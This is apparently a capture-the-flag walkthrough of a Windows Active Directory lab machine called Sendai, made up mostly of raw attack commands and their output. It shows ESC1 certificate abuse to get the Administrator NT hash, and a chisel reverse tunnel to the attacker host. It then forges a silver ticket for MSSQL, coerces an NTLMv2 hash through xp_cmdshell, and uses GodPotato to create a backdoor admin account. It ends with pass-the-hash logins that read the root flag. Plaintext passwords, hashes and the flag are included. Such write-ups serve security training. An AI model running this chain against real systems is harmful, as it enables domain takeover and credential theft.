certipy-ad find -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2026-05-11T11:38:18+00:00
    Permissions
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Authenticated Users
        Write Owner Principals          : SENDAI.VL\Authenticated Users
        Write Dacl Principals           : SENDAI.VL\Authenticated Users
    [+] User Enrollable Principals      : SENDAI.VL\Authenticated Users
    [+] User ACL Principals             : SENDAI.VL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
```

this time ESC1 shows up interesting.... 

```
certipy-ad req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -ca sendai-DC-CA -target DC.sendai.vl -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sendai.vl'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.66                                                                                                                                                         
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sendai.vl'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a

```

got the admin hash.... 
lets also look at sqlsvc account 
```
chisel server --port 8000 --reverse                   
2026/05/11 18:43:02 server: Reverse tunnelling enabled
2026/05/11 18:43:02 server: Fingerprint MgUprdYschlgchZPKU2Yn7GuX+3zNPDkpRg4urLKYXM=
2026/05/11 18:43:02 server: Listening on http://0.0.0.0:8000
2026/05/11 18:44:52 server: session#1: Client version (1.9.1) differs from server version (1.11.5-0kali1)
2026/05/11 18:44:52 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening


*Evil-WinRM* PS C:\ProgramData> .\chisel.exe client 10.10.14.66:8000 R:socks
chisel.exe : 2026/05/11 04:44:51 client: Connecting to ws://10.10.14.66:8000
    + CategoryInfo          : NotSpecified: (2026/05/11 04:4...0.10.14.66:8000:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/05/11 04:44:52 client: Connected (Latency 97.5547ms)

```

```
proxychains mssqlclient.py -windows-auth sendai.vl/sqlsvc:SurenessBlob85@localhost
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/local/bin/mssqlclient.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'mssqlclient.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SENDAI\sqlsvc  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   
SQL (SENDAI\sqlsvc  guest@master)> 
```

so we are able to connect that means no issue in chisel
now we will need NTLM hash so we can go online and use any service to create one 

 ```
 sqlsvc:58655C0B90B2492F84FB46FA78C2D96A
 ```
 now lets use ticketer.py and create a ticket 
 
```
ticketer.py -nthash 58655C0B90B2492F84FB46FA78C2D96A -domain-sid S-1-5-21-3085872742-570972823-736764132 -domain sendai.vl -spn MSSQL/dc.sendai.vl administrator
/usr/local/bin/ticketer.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'ticketer.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sendai.vl/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ KRB5CCNAME=administrator.ccache proxychains mssqlclient.py dc.sendai.vl -k -no-pass
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/local/bin/mssqlclient.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'mssqlclient.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.66:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SENDAI\Administrator  dbo@master)> 
```

we are in 
```
SQL (SENDAI\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SENDAI\Administrator  dbo@master)> xp_cmdshell whoami
output          
-------------   
sendai\sqlsvc   
NULL  
```

ok we can use xp_cmdshell, now lets see if we can get hash using responder 
```
SQL (SENDAI\Administrator  dbo@master)> EXEC xp_cmdshell 'dir \\10.10.14.66\lol';
output              
-----------------   
Access is denied.   
NULL   

[SMB] NTLMv2-SSP Hash     : sqlsvc::SENDAI:d30b2a71370a9ebf:F8471BA05587A3ADBA1A101E1F84010C:0101000000000000000AE59777E1DC017D75011A6285B68F00000000020008004900320033004B0001001E00570049004E002D0036004700310056004F004D0034004F0041005100570004003400570049004E002D0036004700310056004F004D0034004F004100510057002E004900320033004B002E004C004F00430041004C00030014004900320033004B002E004C004F00430041004C00050014004900320033004B002E004C004F00430041004C0007000800000AE59777E1DC0106000400020000000800300030000000000000000000000000300000646C1034040EDC59FE6A819C76210B29FF80F3BCF927F3269A74271F7AB6A1A40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360036000000000000000000 
```

and we got hash for sqlsvc lmao lets look what we can do 
```
SQL (SENDAI\Administrator  dbo@master)> xp_cmdshell whoami /all
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
USER INFORMATION                                                                   
----------------                                                                   
NULL                                                                               
User Name     SID                                                                  
============= ============================================                         
sendai\sqlsvc S-1-5-21-3085872742-570972823-736764132-1104                         
NULL                                                                               
NULL                                                                               
GROUP INFORMATION                                                                  
-----------------                                                                  
NULL                                                                               
Group Name                                 Type             SID                                                             Attributes                                           
========================================== ================ =============================================================== ==================================================   
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group   
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group   
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group   
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group   
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group   
NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner       
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group   
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group   
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                         
NULL                                                                               
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL                                                                               
NULL                                                                               
USER CLAIMS INFORMATION                                                            
-----------------------                                                            
NULL                                                                               
User claims unknown.                                                               
NULL                                                                               
Kerberos support for Dynamic Access Control on this device has been disabled.      
NULL
```

ok so this user has SeImpersonatePrivilege enabled, so i can do GodPotato exploit 
https://github.com/BeichenDream/GodPotato/releases/tag/V1.20
we will use it to make a new user local admin 
```
SQL (SENDAI\Administrator  dbo@master)> EXEC xp_cmdshell 'C:\Windows\Temp\GodP.exe -cmd "net user hacker Password123! /add"'
output                                                                                   
--------------------------------------------------------------------------------------   
[*] CombaseModule: 0x140706832187392                                                     
[*] DispatchTable: 0x140706834774344                                                     
[*] UseProtseqFunction: 0x140706834067648                                                
[*] UseProtseqFunctionParamCount: 6                                                      
[*] HookRPC                                                                              
[*] Start PipeServer                                                                     
[*] Trigger RPCSS                                                                        
[*] CreateNamedPipe \\.\pipe\caad5c4f-a7da-4972-b1ff-e6e022fec2b2\pipe\epmapper          
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                                  
[*] DCOM obj IPID: 0000c802-0300-ffff-bb92-d5145b75ab22                                  
[*] DCOM obj OXID: 0xae42f3a20f3c8b1f                                                    
[*] DCOM obj OID: 0xaae20af4c13f7281                                                     
[*] DCOM obj Flags: 0x281                                                                
[*] DCOM obj PublicRefs: 0x0                                                             
[*] Marshal Object bytes len: 100                                                        
[*] UnMarshal Object                                                                     
[*] Pipe Connected!                                                                      
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                            
[*] CurrentsImpersonationLevel: Impersonation                                            
[*] Start Search System Token                                                            
[*] PID : 916 Token:0x776  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
[*] Find System Token : True                                                             
[*] UnmarshalObject: 0x80070776                                                          
[*] CurrentUser: NT AUTHORITY\SYSTEM                                                     
[*] process start with pid 2972                                                          
The command completed successfully.                                                      
NULL                                                                                     
NULL                                                                                     
SQL (SENDAI\Administrator  dbo@master)> EXEC xp_cmdshell 'C:\Windows\Temp\GodP.exe -cmd "net localgroup administrators hacker /add"'
output                                                                                   
--------------------------------------------------------------------------------------   
[*] CombaseModule: 0x140706832187392                                                     
[*] DispatchTable: 0x140706834774344                                                     
[*] UseProtseqFunction: 0x140706834067648                                                
[*] UseProtseqFunctionParamCount: 6                                                      
[*] HookRPC                                                                              
[*] Start PipeServer                                                                     
[*] CreateNamedPipe \\.\pipe\d1ee4200-d3cf-4ee5-8b99-fc524db58ad8\pipe\epmapper          
[*] Trigger RPCSS                                                                        
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                                  
[*] DCOM obj IPID: 00000002-1798-ffff-2c28-2b879d9898f7                                  
[*] DCOM obj OXID: 0xa81797fc40ad2dcb                                                    
[*] DCOM obj OID: 0xb47d2b7b1763acab                                                     
[*] DCOM obj Flags: 0x281                                                                
[*] DCOM obj PublicRefs: 0x0                                                             
[*] Marshal Object bytes len: 100                                                        
[*] UnMarshal Object                                                                     
[*] Pipe Connected!                                                                      
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                            
[*] CurrentsImpersonationLevel: Impersonation                                            
[*] Start Search System Token                                                            
[*] PID : 916 Token:0x776  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
[*] Find System Token : True                                                             
[*] UnmarshalObject: 0x80070776                                                          
[*] CurrentUser: NT AUTHORITY\SYSTEM                                                     
[*] process start with pid 4496                                                          
The command completed successfully.                                                      
NULL                                                                                     
NULL
```

lets try to connect using the new user and see if we can get root flag 
```
psexec.py 'sendai.vl/hacker:Password123!@10.129.234.66'
/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'psexec.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.234.66.....
[*] Found writable share ADMIN$
[*] Uploading file rUgPCNYi.exe
[*] Opening SVCManager on 10.129.234.66.....
[*] Creating service huIE on 10.129.234.66.....
[*] Starting service huIE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop> type root.txt
1bc134a7b4ae19fcc072082026d991cf

```

we got the root flag....
lets also see using the admin hash we got earlier
```
evil-winrm -i 10.129.234.66 -u Administrator -H cfb106feec8b89a3d98e14dcbe8d087a
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1bc134a7b4ae19fcc072082026d991cf

```

